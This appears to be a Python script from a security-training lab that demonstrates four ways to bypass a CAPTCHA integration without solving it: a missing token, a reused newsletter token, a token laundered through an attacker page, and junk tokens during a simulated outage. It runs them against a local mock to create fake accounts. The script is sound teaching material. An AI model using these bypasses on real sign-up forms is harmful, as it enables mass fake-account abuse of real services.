"""
Chapter 6 — Round 1 Attack: get past the CAPTCHA without solving it (Section 6.2)

Rung 0 of the attack ladder: don't solve the puzzle, find the integration
bug. Four techniques, five sign-ups each:

  missing      no token at all ("the widget failed to load")
  newsletter   a token from the newsletter form. That widget never shows a
               puzzle, so tokens are free; only the `action` says "newsletter".
  laundered    a token minted for YOUR sitekey on the attacker's own page
               (hostname free-movies.example), where unsuspecting visitors
               pass the widget for them. Sitekeys are public.
  outage       during a provider incident, any junk token. The script
               simulates the incident with the mock's /lab/chaos endpoint.

None of these pays a solving farm. That is the point: they cost ~nothing.

Expected results:
  - DEFENSE_LEVEL=1, shipped verifier → 20/20 accounts (all four work)
  - DEFENSE_LEVEL=1, fixed verifier   → 0/20

Rules of engagement: a bot may mint tokens for non-interactive actions
(newsletter) and for other hostnames. Interactive tokens for localhost cost
money: they come only from attacks/farm.py.

Run:
    python attacks/round1_bypass.py
"""

import os
import sys
import time

import httpx

from common import bot, require_local, summary

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from labkit import PROVIDER_URL, mint_token  # noqa: E402

PER_TECHNIQUE = 5


def token_for(technique, ip):
    if technique == "missing":
        return ""
    if technique == "newsletter":
        return mint_token(ip, "newsletter")
    if technique == "laundered":
        return mint_token("198.51.100.200", "register", hostname="free-movies.example")
    if technique == "outage":
        return "0.not-a-real-token"
    raise ValueError(technique)


def run():
    """Run the attack; return a summary dict (used by tools/checkpoint.py)."""
    require_local()
    results = {}
    for technique in ("missing", "newsletter", "laundered", "outage"):
        c = bot()
        ip = c.headers["X-Lab-Client-IP"]
        if technique == "outage":
            httpx.post(f"{PROVIDER_URL}/lab/chaos", json={"mode": "error", "seconds": 5})
        ok, reasons = 0, []
        for i in range(PER_TECHNIQUE):
            r = c.post("/register", data={
                "email": f"{technique}{i}-{time.time_ns()}@example.test",
                "password": "hunter2", "cf-turnstile-response": token_for(technique, ip)})
            ok += r.status_code == 201
            if r.status_code != 201:
                reasons.append(r.json().get("error"))
        if technique == "outage":
            httpx.post(f"{PROVIDER_URL}/lab/chaos", json={"mode": "ok"})
        results[technique] = {"successes": ok, "reasons": sorted(set(reasons))}
    total = sum(v["successes"] for v in results.values())
    return summary("round1_bypass", 4 * PER_TECHNIQUE, total, techniques=results)


if __name__ == "__main__":
    s = run()
    print("=== Round 1: CAPTCHA bypass without solving ===")
    for technique, v in s["techniques"].items():
        print(f"  {technique:<11} {v['successes']}/{PER_TECHNIQUE} accounts"
              + (f"   rejected: {', '.join(v['reasons'])}" if v["reasons"] else ""))
    print(f"  total: {s['successes']}/{s['attempts']} fake accounts, $0.00 spent on solving")
